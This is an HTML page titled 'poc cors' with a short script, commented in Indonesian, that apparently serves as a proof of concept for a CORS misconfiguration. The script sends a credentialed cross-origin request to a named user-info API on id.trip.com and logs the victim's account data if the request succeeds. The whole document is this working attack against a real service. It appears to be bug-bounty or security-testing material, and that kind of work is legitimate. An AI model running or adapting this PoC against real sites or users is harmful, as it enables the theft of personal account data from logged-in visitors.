<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>poc cors</h1>
    <script>
        // 1. Inisialisasi objek XMLHttpRequest
var xhr = new XMLHttpRequest();

// 2. Konfigurasi Method dan URL target
var url = "https://id.trip.com/restapi/soa2/27024/getUserInfo";
xhr.open("GET", url, true);

// 3. AKTIFKAN CREDENTIALS (Mengirimkan Cookie antar-domain)
xhr.withCredentials = true;

// 4. Handle response dari server
xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
            // Jika sukses dan CORS mengizinkan, data sensitif akan muncul di sini
            console.log("Data berhasil diambil:", xhr.responseText);
        } else {
            console.error("Gagal mengambil data. Status:", xhr.status);
        }
    }
};

// 5. Kirim request
xhr.send();

    </script>
</body>
</html>
